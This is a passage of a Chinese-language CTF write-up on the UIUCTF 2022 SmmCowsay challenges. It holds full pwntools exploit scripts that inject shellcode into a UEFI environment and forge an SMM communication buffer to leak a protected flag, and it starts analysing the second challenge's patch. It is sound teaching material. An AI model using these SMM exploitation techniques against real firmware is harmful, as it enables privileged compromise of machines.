<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可是一运行会发生报错：  </p>
<img src="/2024/12/14/uefi/19.png" class="" title="我的图图呢">  

<p>由于是在执行完最后一段 shellcode 后才出现的报错，我们不难判断问题出现在 Communicate 函数的调用，通过 rax 我们可以发现其报错代码为 0xf EFI_ACCESS_DENIED，访问拒绝。  </p>
<p>查看源码中对这个报错代码的解释：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Communicates with a registered handler.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  This function provides a service to send and receive messages from a registered</span></span><br><span class="line"><span class="comment">  UEFI service.  This function is part of the SMM Communication Protocol that may</span></span><br><span class="line"><span class="comment">  be called in physical mode prior to SetVirtualAddressMap() and in virtual mode</span></span><br><span class="line"><span class="comment">  after SetVirtualAddressMap().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param[in] This                The EFI_SMM_COMMUNICATION_PROTOCOL instance.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommBuffer     A pointer to the buffer to convey into SMRAM.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommSize       The size of the data buffer being passed in. On exit, the size of data</span></span><br><span class="line"><span class="comment">                                 being returned. Zero if the handler does not wish to reply with any data.</span></span><br><span class="line"><span class="comment">                                 This parameter is optional and may be NULL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @retval EFI_SUCCESS            The message was successfully posted.</span></span><br><span class="line"><span class="comment">  @retval EFI_INVALID_PARAMETER  The CommBuffer was NULL.</span></span><br><span class="line"><span class="comment">  @retval EFI_BAD_BUFFER_SIZE    The buffer is too large for the MM implementation.</span></span><br><span class="line"><span class="comment">                                 If this error is returned, the MessageLength field</span></span><br><span class="line"><span class="comment">                                 in the CommBuffer header or the integer pointed by</span></span><br><span class="line"><span class="comment">                                 CommSize, are updated to reflect the maximum payload</span></span><br><span class="line"><span class="comment">                                 size the implementation can accommodate.</span></span><br><span class="line"><span class="comment">  @retval EFI_ACCESS_DENIED      The CommunicateBuffer parameter or CommSize parameter,</span></span><br><span class="line"><span class="comment">                                 if not omitted, are in address range that cannot be</span></span><br><span class="line"><span class="comment">                                 accessed by the MM environment.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">SmmCommunicationCommunicate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT VOID                              *CommBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT UINTN                             *CommSize OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br></pre></td></tr></table></figure>

<p>CommunicateBuffer 位于 SMM 环境无法访问的地址范围内。这个时候我们联想到我们上一面讲过的一个缓冲区检查的函数 SmmIsBufferOutsideSmmValid，因为我们的 Buffer 位于我们输入 shellcode 的那个地址空间，必然不符合要求。那原来的程序的 Buffer 是在什么地方或者说是怎么申请的呢？我们继续看题目代码：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br></pre></td></tr></table></figure>

<p>可以发现 Buffer 是通过 AllocateRuntimeZeroPool 函数申请出来的，我们继续看这个函数：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Allocates and zeros a buffer of type EfiRuntimeServicesData. &lt;======分配的data的类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Allocates the number bytes specified by AllocationSize of type EfiRuntimeServicesData, clears the</span></span><br><span class="line"><span class="comment">  buffer with zeros, and returns a pointer to the allocated buffer.  If AllocationSize is 0, then a</span></span><br><span class="line"><span class="comment">  valid buffer of 0 size is returned.  If there is not enough memory remaining to satisfy the</span></span><br><span class="line"><span class="comment">  request, then NULL is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  AllocationSize        The number of bytes to allocate and zero.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return A pointer to the allocated buffer or NULL if allocation fails.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">VOID *</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">AllocateRuntimeZeroPool</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN UINTN  AllocationSize</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">InternalAllocateZeroPool</span> (EfiRuntimeServicesData, AllocationSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后找 gpt 老师问了一下这个函数在干什么：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return InternalAllocateZeroPool (EfiRuntimeServicesData, AllocationSize);: 这行代码调用了 InternalAllocateZeroPool 函数，并将返回值直接返回给调用者。InternalAllocateZeroPool 是一个内部函数，它负责实际分配内存。第一个参数 EfiRuntimeServicesData 是一个枚举值，指定了内存应该从UEFI运行时服务的数据区域分配。第二个参数 AllocationSize 是前面提到的要分配的内存大小。  </span><br></pre></td></tr></table></figure>

<p>也就是说 Buffer 应该是一个 EfiRuntimeServicesData 类型的地址空间。  </p>
<img src="/2024/12/14/uefi/20.png" class="" title="我的图图呢">  

<p>从官方文档可以知道该枚举值为 6。接下来我们就很清楚了，申请一块 EfiRuntimeServicesData 类型的地址空间并写上我们伪造的 Buffer，其他操作和前面一直即可。可是我们没法用已有的东西直接调用 AllocateRuntimeZeroPool，但是我们可以用类似的函数替代，BootServices-&gt;AllocatePool() 和 BootServices-&gt;AllocatePages()都行。只要分配的类型是 EfiRuntimeServicesData 就行。此处使用BootServices-&gt;AllocatePool() 进行分配。  </p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终效果：  </p>
<img src="/2024/12/14/uefi/21.png" class="" title="我的图图呢">  

<p>可能有人会问为什么这个 flag 的偶数位不见了，这是因为 flag 存储是 UTF-16，所以它取数据是一次跳 2 byte 取的。只需要地址加 1 即可获得所有 flag。</p>
<h3 id="UIUCTF-2022-SmmCowsay2"><a href="#UIUCTF-2022-SmmCowsay2" class="headerlink" title="UIUCTF 2022 SmmCowsay2"></a>UIUCTF 2022 SmmCowsay2</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p>
<blockquote>
<p>We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.  </p>
</blockquote>
<p>这一题和上一题的文件结构一模一样，运气起来的效果也一样，唯一不同的就是 patch 文件不一样。由于上一题已经对文件进行了详细的分析，所以这里重点关注漏洞的部分。<br>首先看 0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch 文件：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  // Flag must not be seen</span></span><br><span class="line"><span class="addition">+  SmmSetMemoryAttributes (</span></span><br><span class="line"><span class="addition">+    0x44440000,</span></span><br><span class="line"><span class="addition">+    EFI_PAGES_TO_SIZE(1),</span></span><br><span class="line"><span class="addition">+    EFI_MEMORY_RP</span></span><br><span class="line"><span class="addition">+    );</span></span><br></pre></td></tr></table></figure>

<p>这段代码用 gpt 的话来说，其作用是：</p>
<ul>
<li>SmmSetMemoryAttributes 是一个函数调用，它的作用是设置指定内存范围的属性。</li>
<li>第一个参数 0x44440000 是要设置属性的内存的起始地址。</li>
<li>第二个参数 EFI_PAGES_TO_SIZE(1) 是一个宏，用于将页面数转换为字节数。在这里，它表示只设置一个页面（通常情况下，一个内存页面是4KB大小，除非特别指定了不同的页面大小）。</li>
<li>第三个参数 EFI_MEMORY_RP 是要设置的内存属性。</li>
</ul>
<p>然后我看了一下源码：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Attribute values */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UC		((u64)0x0000000000000001ULL)	<span class="comment">/* uncached */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WC		((u64)0x0000000000000002ULL)	<span class="comment">/* write-coalescing */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WT		((u64)0x0000000000000004ULL)	<span class="comment">/* write-through */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WB		((u64)0x0000000000000008ULL)	<span class="comment">/* write-back */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UCE		((u64)0x0000000000000010ULL)	<span class="comment">/* uncached, exported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WP		((u64)0x0000000000001000ULL)	<span class="comment">/* write-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RP		((u64)0x0000000000002000ULL)	<span class="comment">/* read-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_XP		((u64)0x0000000000004000ULL)	<span class="comment">/* execute-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_NV		((u64)0x0000000000008000ULL)	<span class="comment">/* non-volatile */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_MORE_RELIABLE \</span></span><br><span class="line"><span class="meta">				